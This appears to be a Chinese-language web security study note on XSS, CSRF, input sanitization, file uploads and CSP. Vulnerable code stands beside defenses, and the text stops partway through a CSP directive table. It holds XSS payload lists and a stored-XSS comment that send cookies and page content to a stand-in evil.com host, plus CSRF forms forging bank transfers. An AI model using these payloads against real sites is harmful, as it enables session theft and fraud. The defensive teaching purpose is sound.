# 专项训练 13:00 — Web 安全深度专项

> XSS / CSRF / 输入净化 / 内容安全策略 (CSP)
> 安全代码示例 + 攻防演练
> 2026-04-27 13:00

---

## 目录

1. [XSS (跨站脚本攻击)](#1-xss-跨站脚本攻击)
2. [CSRF (跨站请求伪造)](#2-csrf-跨站请求伪造)
3. [输入净化 (Sanitization)](#3-输入净化-sanitization)
4. [内容安全策略 (CSP)](#4-内容安全策略-csp)
5. [综合攻防演练](#5-综合攻防演练)
6. [安全代码 Checklist](#6-安全代码-checklist)
7. [面试高频题](#7-面试高频题)

---

## 1. XSS (跨站脚本攻击)

### 1.1 三种 XSS 类型

| 类型 | 注入位置 | 触发方式 | 危害范围 |
|------|---------|---------|---------|
| **反射型 (Reflected)** | URL 参数 → 服务端拼接 → 响应 HTML | 用户点击恶意链接 | 单次请求 |
| **存储型 (Stored)** | 用户输入 → 数据库 → 页面渲染 | 访问含恶意数据的页面 | 所有访问用户 |
| **DOM 型 (DOM-based)** | 前端 JS 直接操作 DOM (innerHTML/eval) | 前端解析恶意输入 | 当前页面 |

### 1.2 攻击向量全景

```
攻击向量矩阵:
┌─────────────┬──────────────────────────────────────────────┐
│ 注入点       │ 常见载体                                      │
├─────────────┼──────────────────────────────────────────────┤
│ HTML 内容    │ <script>alert(1)</script>                    │
│ HTML 属性    │ <img src=x onerror="alert(1)">               │
│ URL 参数     │ <a href="javascript:alert(1)">               │
│ CSS 属性     │ <div style="background:url(javascript:...)"> │
│ 事件处理器    │ <img src=x onerror=fetch(url)>               │
│ JSON 响应    │ 未转义的 JSON 在 <script> 中解析              │
│ SVG/HTML5    │ <svg onload="alert(1)">                      │
│ Template     │ 模板引擎未转义的变量插值                      │
└─────────────┴──────────────────────────────────────────────┘
```

### 1.3 攻击示例与防御

#### 1.3.1 反射型 XSS — URL 参数注入

```html
<!-- ❌ 漏洞代码：服务端直接拼接 URL 参数 -->
<!-- GET /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script> -->
<h1>搜索结果: <span id="result">用户输入的原始内容</span></h1>

<!-- 服务端 (Node.js/Express) 危险写法 -->
<script>
// ❌ 极度危险：直接输出用户输入
app.get('/search', (req, res) => {
  const q = req.query.q;
  res.send(`<h1>搜索结果: ${q}</h1>`);
});
</script>

<!-- ✅ 防御方案 1：HTML 实体编码 (服务端) -->
<script>
function escapeHtml(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`': '&#96;' };
  return String(str).replace(/[&<>"'\/`]/g, c => map[c]);
}

app.get('/search', (req, res) => {
  const q = req.query.q;
  res.send(`<h1>搜索结果: ${escapeHtml(q)}</h1>`);
});
</script>

<!-- ✅ 防御方案 2：使用 textContent (前端) -->
<script>
// ❌ 危险：innerHTML 会解析 HTML
document.getElementById('result').innerHTML = userInput;

// ✅ 安全：textContent 只当纯文本
document.getElementById('result').textContent = userInput;
</script>
```

#### 1.3.2 存储型 XSS — 评论区注入

```javascript
// ❌ 漏洞场景：用户提交评论，存入数据库，展示时未转义
// 攻击者提交:
const maliciousComment = `
  <img src=x onerror="
    const d=document,i=new Image();
    i.src='https://evil.com/steal?cookie='+encodeURIComponent(d.cookie)+'&dom='+encodeURIComponent(d.documentElement.outerHTML);
    d.body.appendChild(i);
  ">
  这是一条正常评论
`;

// ✅ 防御方案 1：输入净化 (入库前)
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function sanitizeComment(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href'],
    // 禁止所有事件处理器
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
    // 禁止 javascript: 协议
    ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp):\/\/|mailto:|tel:|#)/i,
  });
}

// ✅ 防御方案 2：输出转义 (渲染时) — 双重保险
function renderComment(comment) {
  // 即使入库时净化了，输出时也转义 (Defense in Depth)
  return `<div class="comment">${escapeHtml(comment)}</div>`;
}

// ✅ 防御方案 3：CSP 兜底
// Content-Security-Policy: default-src 'self'; script-src 'self'
// 即使 XSS 注入成功，也无法执行外部脚本
```

#### 1.3.3 DOM 型 XSS — 前端直接操作

```html
<!-- ❌ 漏洞场景：前端从 URL 读取参数直接写入 DOM -->
<!-- 攻击 URL: /page#<img src=x onerror=alert(document.cookie)> -->
<script>
// ❌ 危险：hash 直接写入 innerHTML
const hash = window.location.hash.slice(1);
document.getElementById('content').innerHTML = hash;

// ❌ 危险：document.write
document.write('<div>' + location.search + '</div>');

// ❌ 危险：eval / setTimeout 字符串
eval('console.log(' + userInput + ')');
setTimeout('alert(1)', 1000);
new Function('return ' + userInput)();

// ❌ 危险：动态创建 script 标签
const script = document.createElement('script');
script.text = userInput; // 可执行任意代码
document.head.appendChild(script);

// ❌ 危险：setAttribute + javascript: 协议
const a = document.createElement('a');
a.setAttribute('href', userInput); // userInput = "javascript:alert(1)"
</script>

<!-- ✅ 防御方案 -->
<script>
// 1. 永远不用 innerHTML 写入不可信数据
document.getElementById('content').textContent = hash;

// 2. 需要 HTML 时先净化
document.getElementById('content').innerHTML = DOMPurify.sanitize(hash);

// 3. 永远不用 eval / Function / setTimeout(string)
// 用 JSON.parse 替代 eval
const data = JSON.parse(userInput);

// 4. URL 属性白名单
function safeSetHref(element, url) {
  const allowed = /^(https?:\/\/|mailto:|tel:|#)/i;
  if (allowed.test(url)) {
    element.href = url;
  } else {
    element.href = '#';
  }
}

// 5. 使用 URL 对象验证
function safeRedirect(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    // 只允许同域名跳转
    if (parsed.origin === window.location.origin) {
      window.location.href = parsed.href;
    }
  } catch (e) {
    console.warn('Invalid URL:', url);
  }
}
</script>
```

#### 1.3.4 模板引擎 XSS

```html
<!-- ❌ Vue 2: v-html 直接渲染 HTML -->
<!-- ❌ React: dangerouslySetInnerHTML -->
<!-- ❌ Angular: [innerHTML] without sanitization -->

<!-- ✅ Vue: 使用 v-text (默认转义) 或 v-html + DOMPurify -->
<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    safeHtml() {
      return DOMPurify.sanitize(this.rawHtml);
    }
  }
}
// <div v-html="safeHtml"></div>

// ✅ React: 默认 JSX 转义，需要 HTML 时用 sanitize
import sanitizeHtml from 'sanitize-html';

function SafeRender({ html }) {
  const clean = sanitizeHtml(html, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],
    allowedAttributes: { 'a': ['href'] }
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ Angular: 使用 DomSanitizer
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  template: `<div [innerHTML]="safeHtml"></div>`
})
class MyComponent {
  constructor(private sanitizer: DomSanitizer) {}
  
  get safeHtml(): SafeHtml {
    return this.sanitizer.bypassSecurityTrustHtml(
      sanitizeHtml(this.rawHtml, { allowedTags: ['b', 'i', 'p'] })
    );
  }
}
</script>
```

### 1.4 XSS 攻防演练

```javascript
// ========== 攻防演练：构建一个安全的评论系统 ==========

// === 攻击者视角：尝试各种注入 ===
const attackPayloads = [
  // 1. 基础 script 注入
  '<script>alert("XSS")</script>',
  
  // 2. 事件处理器注入
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  
  // 3. 编码绕过
  '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',  // HTML entity
  '%3Cscript%3Ealert(1)%3C/script%3E',                 // URL encode
  '\u003cscript\u003ealert(1)\u003c/script\u003e',   // Unicode escape
  '<ScRiPt>alert(1)</ScRiPt>',                          // 大小写混淆
  
  // 4. 协议绕过
  '<a href="javascript:alert(1)">click</a>',
  '<a href="data:text/html,<script>alert(1)</script>">',
  '<iframe src="data:text/html,<script>alert(1)</script>">',
  
  // 5. CSS 注入
  '<div style="background:url(javascript:alert(1))">',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red">',
  
  // 6. 复杂绕过
  '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',  // base64
  '<img src=x onerror="this.src=\'https://evil.com/?c=\'+document.cookie">',
  '<script>new Image().src="https://evil.com/?c="+document.cookie</script>',
  
  // 7. 二次注入 (存储后在其他页面触发)
  '<script>fetch("https://evil.com/steal",{method:"POST",body:document.cookie})</script>',
  
  // 8. Blind XSS (管理面板触发)
  '<img src=x onerror="fetch(`https://evil.com/log?admin=${document.cookie}`)">',
];

// === 防御者视角：构建多层防御 ===
class XSSDefense {
  constructor() {
    this.htmlEscapeMap = {
      '&': '&amp;', '<': '&lt;', '>': '&gt;',
      '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`': '&#96;'
    };
    
    this.dangerousTags = new Set([
      'script', 'style', 'iframe', 'object', 'embed', 'form',
      'input', 'button', 'textarea', 'select', 'link', 'meta',
      'base', 'applet', 'frameset', 'xml'
    ]);
    
    this.dangerousAttrs = new Set([
      'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
      'onblur', 'onsubmit', 'onchange', 'oninput', 'onkeydown',
      'onkeyup', 'onkeypress', 'onmousedown', 'onmouseup',
      'onmousemove', 'onmouseout', 'onresize', 'onscroll',
      'onabort', 'ondblclick', 'ondrag', 'ondrop', 'oncopy',
      'oncut', 'onpaste', 'onbeforeunload', 'onunload',
      'formaction', 'xlink:href'
    ]);
  }

  // 层1: HTML 实体编码 (最基础)
  escapeHtml(str) {
    return String(str).replace(/[&<>"'\/`]/g, c => this.htmlEscapeMap[c]);
  }

  // 层2: 属性值编码
  escapeAttr(str) {
    return String(str).replace(/[&<>"'`=\(\)]/g, c => {
      const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '`': '&#96;', '=': '&#61;', '(': '&#40;', ')': '&#41;' };
      return map[c];
    });
  }

  // 层3: JavaScript 字符串编码
  escapeJs(str) {
    return String(str).replace(/[\\'"`\/\n\r\t\b\f]/g, c => {
      const map = { '\\': '\\\\', '"': '\\"', "'": "\\'", '`': '\\`', '/': '\\/', '\n': '\\n', '\r': '\\r', '\t': '\\t', '\b': '\\b', '\f': '\\f' };
      return map[c];
    });
  }

  // 层4: URL 编码
  escapeUrl(str) {
    return encodeURIComponent(str);
  }

  // 层5: 综合净化 (允许部分 HTML)
  sanitize(input, options = {}) {
    const {
      allowedTags = new Set(['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'span', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6']),
      allowedAttrs = new Set(['href', 'title', 'class']),
      allowedProtocols = /^(https?|mailto|tel):/i
    } = options;

    // 1. 先移除所有 script/style 标签及其内容
    let cleaned = input
      .replace(/<script[\s\S]*?<\/script>/gi, '')
      .replace(/<style[\s\S]*?<\/style>/gi, '');

    // 2. 移除所有事件处理器
    cleaned = cleaned.replace(/\s+on\w+\s*=\s*["'][^"']*["']/gi, '');
    cleaned = cleaned.replace(/\s+on\w+\s*=\s*\S+/gi, '');

    // 3. 移除 javascript: / data: 协议
    cleaned = cleaned.replace(/javascript\s*:/gi, '');
    cleaned = cleaned.replace(/data\s*:/gi, '');
    cleaned = cleaned.replace(/vbscript\s*:/gi, '');

    // 4. 白名单标签过滤
    cleaned = cleaned.replace(/<\/?(\w+)[^>]*>/gi, (match, tagName) => {
      if (!allowedTags.has(tagName.toLowerCase())) {
        return '';
      }
      return match;
    });

    // 5. 白名单属性过滤
    cleaned = cleaned.replace(/<(\w+)\s+([^>]*)>/gi, (match, tag, attrs) => {
      const safeAttrs = attrs.split(/\s+/).filter(attr => {
        const [name] = attr.split('=');
        return allowedAttrs.has(name.toLowerCase());
      });
      return `<${tag} ${safeAttrs.join(' ')}>`;
    });

    // 6. href 协议验证
    cleaned = cleaned.replace(/href\s*=\s*["']([^"']*)["']/gi, (match, url) => {
      if (allowedProtocols.test(url) || url.startsWith('#') || url.startsWith('/')) {
        return `href="${this.escapeAttr(url)}"`;
      }
      return 'href="#"';
    });

    return cleaned;
  }
}

// === 演练：测试所有攻击载荷 ===
const defense = new XSSDefense();

console.log('=== XSS 攻防演练 ===\n');

attackPayloads.forEach((payload, i) => {
  const escaped = defense.escapeHtml(payload);
  const sanitized = defense.sanitize(payload);
  
  console.log(`攻击 ${i + 1}: ${payload.substring(0, 50)}...`);
  console.log(`  实体编码后: ${escaped.substring(0, 60)}...`);
  console.log(`  净化后:     ${sanitized.substring(0, 60) || '(空)'}...`);
  console.log();
});

// === 实战：安全的评论渲染系统 ===
class SecureCommentSystem {
  constructor() {
    this.defense = new XSSDefense();
  }

  // 入库：净化 + 验证
  submitComment(userId, content) {
    // 1. 长度限制
    if (content.length > 5000) {
      throw new Error('评论过长');
    }

    // 2. 净化
    const sanitized = this.defense.sanitize(content, {
      allowedTags: new Set(['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li']),
      allowedAttrs: new Set(['href', 'title']),
      allowedProtocols: /^(https?|mailto):/i
    });

    // 3. 存储
    return { userId, content: sanitized, timestamp: Date.now() };
  }

  // 渲染：双重转义
  renderComment(comment) {
    return `
      <div class="comment" data-user="${this.defense.escapeAttr(comment.userId)}">
        <p>${this.defense.escapeHtml(comment.content)}</p>
        <time>${this.defense.escapeHtml(new Date(comment.timestamp).toISOString())}</time>
      </div>
    `;
  }
}
```

---

## 2. CSRF (跨站请求伪造)

### 2.1 攻击原理

```
CSRF 攻击流程:
┌──────────┐     1. 登录银行网站      ┌──────────┐
│  用户     │ ──────────────────────→ │ 银行网站  │
│ (浏览器)  │ ←────────────────────── │ (Set-Cookie│
│          │     2. 返回 Cookie       │  Session)  │
└────┬─────┘                        └──────────┘
     │
     │  3. 访问恶意网站 (含 CSRF 攻击)
     │ ┌──────────────────────────────┐
     │ │ <img src="https://bank.com/  │
     │ │   transfer?to=attacker&      │
     │ │   amount=10000">             │
     │ │ <!-- 或自动提交的表单 -->      │
     │ │ <form action="https://bank.com│
     │ │   /transfer" method="POST">   │
     │ │   <input name="to" value="attacker">
     │ │   <input name="amount" value="10000">
     │ │ </form>                       │
     │ │ <script>document.forms[0].submit()</script>
     │ └──────────────────────────────┘
     │
     │  4. 浏览器自动携带 Cookie 发送请求
     │ ┌──────────────────────────────┐
     │ │ POST /transfer               │
     │ │ Cookie: session=abc123       │ ← 自动携带!
     │ │ to=attacker&amount=10000     │
     │ └──────────────────────────────┘
     │
     ▼
┌──────────┐
│ 银行网站   │ → 验证 Cookie 通过 → 执行转账!
└──────────┘
```

### 2.2 攻击示例

```html
<!-- ❌ 漏洞场景：银行网站没有 CSRF 保护 -->
<!-- 恶意网站上的攻击代码 -->

<!-- 攻击 1: 图片标签 GET 请求 -->
<img src="https://bank.com/api/transfer?to=attacker&amount=100000" 
     style="display:none">

<!-- 攻击 2: 自动提交表单 POST 请求 -->
<!DOCTYPE html>
<html>
<body>
  <form id="csrf-form" action="https://bank.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="999999">
    <input type="hidden" name="currency" value="USD">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>

<!-- 攻击 3: Fetch 请求 (SameSite 未设置时) -->
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // 自动携带 Cookie
    body: JSON.stringify({ to: 'attacker', amount: 999999 })
  });
</script>

<!-- 攻击 4: 利用第三方 Cookie (跨站 iframe) -->
<iframe src="https://bank.com/api/transfer?to=attacker&amount=1000" 
        style="display:none"></iframe>
```

### 2.3 防御方案

```javascript
// ========== CSRF 防御体系 ==========

// === 防御 1: SameSite Cookie (最简单有效) ===
// 服务端设置 Cookie 属性
app.use((req, res, next) => {
  res.cookie('session', sessionId, {
    httpOnly: true,       // JS 无法读取
    secure: true,         // 仅 HTTPS
    sameSite: 'strict',   // 最严格: 跨站完全不发送
    // sameSite: 'lax',   // 宽松: GET 跨站发送, POST 不发送
    // sameSite: 'none',  // 不设置 (默认, 危险!)
    maxAge: 3600000,      // 1 小时
    path: '/'
  });
  next();
});

// Express session 配置
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  }
}));

// === 防御 2: CSRF Token (双重保险) ===
const crypto = require('crypto');

// 生成 CSRF Token
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 服务端: 生成并存储 Token
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  // 暴露给前端
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// 服务端: 验证 Token
function csrfVerify(req, res, next) {
  const token = req.body._csrf || 
                req.headers['x-csrf-token'] || 
                req.query._csrf;
  
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

app.post('/api/transfer', csrfVerify, (req, res) => {
  // 处理转账
});

// 前端: 在表单中嵌入 Token
// HTML 模板:
// <form method="POST">
//   <input type="hidden" name="_csrf" value="{{csrfToken}}">
//   <!-- 表单内容 -->
// </form>

// 前端: Fetch 请求携带 Token
async function safeFetch(url, options = {}) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  
  const response = await fetch(url, {
    ...options,
    credentials: 'same-origin', // 只同站携带 Cookie
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
      'Content-Type': 'application/json'
    }
  });
  
  return response;
}

// === 防御 3: Double Submit Cookie ===
// 原理: Token 同时存在 Cookie 和请求体中，服务端比对
function doubleSubmitDefense() {
  return (req, res, next) => {
    const cookieToken = req.cookies.csrf_token;
    const bodyToken = req.body._csrf || req.headers['x-csrf-token'];
    
    if (!cookieToken || !bodyToken || cookieToken !== bodyToken) {
      return res.status(403).json({ error: 'CSRF validation failed' });
    }
    next();
  };
}

// === 防御 4: Origin/Referer 验证 ===
function originCheck(req, res, next) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];
  
  // 检查 Origin
  if (req.headers.origin) {
    if (!allowedOrigins.includes(origin)) {
      return res.status(403).json({ error: 'Origin not allowed' });
    }
  }
  
  // 检查 Referer (更宽松)
  if (req.headers.referer) {
    try {
      const refererOrigin = new URL(referer).origin;
      if (!allowedOrigins.includes(refererOrigin)) {
        return res.status(403).json({ error: 'Referer not allowed' });
      }
    } catch (e) {
      return res.status(403).json({ error: 'Invalid Referer' });
    }
  }
  
  next();
}

// === 防御 5: 敏感操作二次验证 ===
app.post('/api/transfer', csrfVerify, (req, res) => {
  const { to, amount, password } = req.body;
  
  // 大额转账需要密码确认
  if (amount > 10000) {
    // 验证密码 (二次确认)
    const isValid = verifyPassword(password);
    if (!isValid) {
      return res.status(401).json({ error: 'Password required for large transfers' });
    }
  }
  
  // 处理转账...
});
```

### 2.4 CSRF 攻防演练

```javascript
// ========== CSRF 攻防演练 ==========

class CSRFAttackSimulator {
  constructor() {
    this.attacks = [];
  }

  // 攻击 1: 无 SameSite 的 Cookie 被跨站利用
  attack1_noSameSite() {
    console.log('\n=== 攻击 1: 无 SameSite 保护的 Cookie ===');
    console.log('场景: 用户登录银行后访问恶意网站');
    console.log('恶意网站: <img src="https://bank.com/transfer?to=attacker&amount=10000">');
    console.log('结果: 浏览器自动携带 Cookie, 转账成功! ❌');
    console.log('防御: Set-Cookie: session=xxx; SameSite=Strict ✅');
  }

  // 攻击 2: 无 CSRF Token 的表单提交
  attack2_noCSRFToken() {
    console.log('\n=== 攻击 2: 无 CSRF Token 的表单 ===');
    console.log('场景: 恶意网站自动提交表单到银行 API');
    console.log('恶意网站: <form action="https://bank.com/api/transfer" method="POST">');
    console.log('  <input name="to" value="attacker"><input name="amount" value="999999">');
    console.log('</form><script>form.submit()</script>');
    console.log('结果: 表单提交成功, 无 Token 验证! ❌');
    console.log('防御: 表单必须包含 _csrf 字段, 服务端验证 ✅');
  }

  // 攻击 3: JSON API 无 Origin 检查
  attack3_noOriginCheck() {
    console.log('\n=== 攻击 3: JSON API 无 Origin 验证 ===');
    console.log('场景: 恶意网站用 fetch 发送 JSON 请求');
    console.log('恶意网站: fetch("https://bank.com/api/transfer", {');
    console.log('  method: "POST", credentials: "include",');
    console.log('  headers: {"Content-Type": "application/json"},');
    console.log('  body: JSON.stringify({to:"attacker",amount:999999})');
    console.log('})');
    console.log('结果: 请求成功! JSON 请求也被 CSRF 利用! ❌');
    console.log('防御: 服务端验证 Origin/Referer + SameSite ✅');
  }

  // 防御: 综合防御体系
  defenseComprehensive() {
    console.log('\n=== 综合防御体系 ===');
    console.log('Layer 1: SameSite=Strict (Cookie 层)');
    console.log('Layer 2: CSRF Token (请求层)');
    console.log('Layer 3: Origin/Referer 验证 (来源层)');
    console.log('Layer 4: 敏感操作二次验证 (业务层)');
    console.log('Layer 5: Content-Type 限制 (API 层)');
    console.log('');
    console.log('防御效果: 即使一层被绕过, 其他层仍然有效 (Defense in Depth)');
  }
}

// 运行演练
const simulator = new CSRFAttackSimulator();
simulator.attack1_noSameSite();
simulator.attack2_noCSRFToken();
simulator.attack3_noOriginCheck();
simulator.defenseComprehensive();
```

---

## 3. 输入净化 (Sanitization)

### 3.1 净化策略矩阵

```
输入净化策略:
┌─────────────┬────────────────┬────────────────┬────────────────┐
│ 上下文        │ 危险字符        │ 净化方式        │ 示例            │
├─────────────┼────────────────┼────────────────┼────────────────┤
│ HTML 内容    │ < > & " '     │ HTML 实体编码   │ < → &lt;       │
│ HTML 属性    │ " ' < > ` =   │ 属性值编码      │ " → &quot;    │
│ JavaScript   │ ' " \ `       │ JS 字符串转义   │ ' → \'        │
│ URL          │ & = ? #       │ URL 编码        │ & → %26       │
│ CSS          │ ( ) ; { }     │ CSS 转义        │ ( → \(        │
│ SQL          │ ' " \ ;       │ 参数化查询      │ ? / $1 占位符   │
│ 命令行       │ ; | & ` $     │ 参数化/白名单    │ 不用 shell exec│
│ 文件路径     │ ../ ..\ / \   │ 路径规范化       │ realpath       │
└─────────────┴────────────────┴────────────────┴────────────────┘
```

### 3.2 输入验证 (Validation) vs 净化 (Sanitization)

```javascript
// ========== 验证 vs 净化 ==========

// 验证: 检查输入是否符合预期格式, 不符合则拒绝
// 净化: 修改输入使其安全, 保留有用内容

// === 验证示例 ===
class InputValidator {
  // 邮箱验证
  static isValidEmail(email) {
    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
  }

  // 用户名验证 (字母数字下划线, 3-20 字符)
  static isValidUsername(username) {
    return /^[a-zA-Z0-9_]{3,20}$/.test(username);
  }

  // 年龄验证
  static isValidAge(age) {
    const n = Number(age);
    return Number.isInteger(n) && n >= 0 && n <= 150;
  }

  // URL 验证
  static isValidUrl(url) {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  }

  // 颜色值验证
  static isValidColor(color) {
    return /^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/.test(color);
  }

  // 综合表单验证
  static validateUserInput(data) {
    const errors = {};
    
    if (!this.isValidEmail(data.email)) {
      errors.email = 'Invalid email format';
    }
    if (!this.isValidUsername(data.username)) {
      errors.username = 'Username: 3-20 alphanumeric characters';
    }
    if (!this.isValidAge(data.age)) {
      errors.age = 'Age must be 0-150';
    }
    
    return {
      valid: Object.keys(errors).length === 0,
      errors
    };
  }
}

// === 净化示例 ===
class InputSanitizer {
  // HTML 内容净化 (保留部分标签)
  static sanitizeHtml(input, options = {}) {
    const {
      allowedTags = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'span'],
      allowedAttrs = ['href', 'title', 'class'],
      maxDepth = 10
    } = options;

    let depth = 0;
    
    return input
      // 1. 移除 script/style 标签及内容
      .replace(/<script[\s\S]*?<\/script>/gi, '')
      .replace(/<style[\s\S]*?<\/style>/gi, '')
      // 2. 移除所有事件处理器
      .replace(/\s+on\w+\s*=\s*["'][^"']*["']/gi, ' ')
      .replace(/\s+on\w+\s*=\s*\S+/gi, ' ')
      // 3. 移除 javascript:/data: 协议
      .replace(/javascript\s*:/gi, '')
      .replace(/data\s*:/gi, '')
      .replace(/vbscript\s*:/gi, '')
      // 4. 白名单标签过滤
      .replace(/<\/?(\w+)([^>]*)>/gi, (match, tag, attrs) => {
        if (!allowedTags.includes(tag.toLowerCase())) {
          return '';
        }
        // 5. 白名单属性过滤
        const safeAttrs = attrs.split(/\s+/).filter(attr => {
          const name = attr.split('=')[0];
          return allowedAttrs.includes(name.toLowerCase());
        }).join(' ');
        return `<${tag}${safeAttrs ? ' ' + safeAttrs : ''}>`;
      });
  }

  // 路径净化
  static sanitizePath(input, baseDir) {
    const path = require('path');
    // 1. 规范化路径
    const normalized = path.normalize(input);
    // 2. 解析为绝对路径
    const resolved = path.resolve(baseDir, normalized);
    // 3. 确保在 baseDir 内
    if (!resolved.startsWith(path.resolve(baseDir))) {
      throw new Error('Path traversal detected');
    }
    return resolved;
  }

  // SQL 输入净化 (使用参数化查询, 不拼接)
  static safeSqlQuery(db, table, conditions) {
    // ❌ 危险: SQL 拼接
    // const query = `SELECT * FROM ${table} WHERE id = ${conditions.id}`;
    
    // ✅ 安全: 参数化查询
    const placeholders = Object.keys(conditions).map((_, i) => `$${i + 1}`).join(', ');
    const values = Object.values(conditions);
    // 白名单表名
    const allowedTables = ['users', 'posts', 'comments'];
    if (!allowedTables.includes(table)) {
      throw new Error('Invalid table name');
    }
    return {
      query: `SELECT * FROM ${table} WHERE id IN (${placeholders})`,
      values
    };
  }

  // 命令注入防护
  static safeExec(command, args) {
    const { execFile } = require('child_process');
    // ❌ 危险: 字符串拼接
    // exec(`ls ${userInput}`);
    
    // ✅ 安全: 参数化执行
    return new Promise((resolve, reject) => {
      execFile(command, args, (error, stdout) => {
        if (error) reject(error);
        else resolve(stdout);
      });
    });
  }
}
```

### 3.3 文件上传安全

```javascript
// ========== 文件上传安全 ==========

const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// === 漏洞: 无限制的文件上传 ===
// ❌ 危险: 直接使用用户上传的文件名
app.post('/upload', upload.single('file'), (req, res) => {
  const filename = req.file.originalname; // 攻击者可以上传 "evil.php"
  req.file.mv(`uploads/${filename}`);
  res.json({ url: `/uploads/${filename}` });
});

// ✅ 安全: 多层防护的文件上传
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'uploads'));
  },
  filename: (req, file, cb) => {
    // 1. 使用随机文件名 (不信任用户输入)
    const ext = path.extname(file.originalname).toLowerCase();
    const randomName = crypto.randomBytes(16).toString('hex');
    cb(null, `${randomName}${ext}`);
  }
});

const upload = multer({
  storage,
  // 2. 文件大小限制
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1 // 最多 1 个文件
  },
  // 3. MIME 类型白名单
  fileFilter: (req, file, cb) => {
    const allowedMimes = [
      'image/jpeg', 'image/png', 'image/gif', 'image/webp',
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    
    if (allowedMimes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error(`File type ${file.mimetype} not allowed`));
    }
  }
});

// 4. 扩展名白名单 (双重检查)
const allowedExtensions = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.doc', '.docx']);

app.post('/upload', upload.single('file'), (req, res) => {
  const ext = path.extname(req.file.originalname).toLowerCase();
  
  if (!allowedExtensions.has(ext)) {
    // 删除已上传的文件
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'File extension not allowed' });
  }
  
  // 5. 图片额外验证: 检查文件头 (Magic Number)
  if (req.file.mimetype.startsWith('image/')) {
    const buf = fs.readFileSync(req.file.path);
    const isImage = checkImageHeader(buf);
    if (!isImage) {
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: 'Invalid image file' });
    }
  }
  
  res.json({
    url: `/uploads/${req.file.filename}`,
    size: req.file.size
  });
});

// 检查图片文件头 (Magic Number)
function checkImageHeader(buf) {
  const headers = {
    // JPEG
    jpg: [0xFF, 0xD8, 0xFF],
    // PNG
    png: [0x89, 0x50, 0x4E, 0x47],
    // GIF
    gif: [0x47, 0x49, 0x46, 0x38],
    // WebP
    webp: [0x52, 0x49, 0x46, 0x46]
  };
  
  for (const [, header] of Object.entries(headers)) {
    if (buf.slice(0, header.length).every((b, i) => b === header[i])) {
      return true;
    }
  }
  return false;
}
```

---

## 4. 内容安全策略 (CSP)

### 4.1 CSP 指令大全

```
CSP 指令参考:
┌──────────────────────┬──────────────────────────────────────────────┐
│ 指令                  │ 作用                                         │
├──────────────────────┼──────────────────────────────────────────────┤
│ default-src          │ 默认源 (所有类型的兜底)                       │
│ script-src           │ JavaScript 源                                │
│ style-src            │ CSS 源                                       │
│ img-src              │ 图片源                                       │
│ font-src             │ 字体源                                       │
│ connect-src          │ XHR/Fetch/WebSocket 源                      │
│ media-src            │ 音视频源                                     │
│ object-src           │ <object>/<embed>/<applet> 源                │
│ frame-src            │ <iframe> 源                                  │
│ worker-src           │ Web Worker / Service Worker 源              │
│ manifest-src         │ Web App Manifest 源                          │
│ base-uri             │ <base> 标签源                                │
│ form-action          │ <form> action 源                             │
│ frame-ancestors      │ 允许嵌入当前页面的父页面源 (替代 X-Frame-Options) │
